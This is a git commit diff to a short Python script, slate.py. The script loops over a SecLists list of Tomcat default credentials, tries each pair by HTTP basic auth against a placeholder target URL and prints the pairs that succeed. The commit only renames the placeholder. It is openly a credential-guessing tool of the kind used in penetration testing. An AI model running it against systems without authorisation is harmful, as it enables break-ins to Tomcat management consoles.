ce6a81c4234c5a84d650bbde5e9aabe5ea83a01b
hftc <50321335+hftc@users.noreply.github.com>
2019-12-05 16:29:48 +0800

    Update slate.py

--- slate.py
+++ slate.py
@@ -3,6 +3,6 @@ import requests , sys
 with open ( '/home/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt' ) as m :
     for n in m :
         q = n.strip ( '\n' ).split ( ':' )
-        if requests.get ( '<insert affected URL here>' , auth = ( q [ 0 ] , q [ 1 ] ) ).status_code == 200 :
+        if requests.get ( '<insert target URL here>' , auth = ( q [ 0 ] , q [ 1 ] ) ).status_code == 200 :
             print 'The credentials \033[0;92m' + n.strip ( '\n' ) + '\033[0m are valid!'
             sys.exit
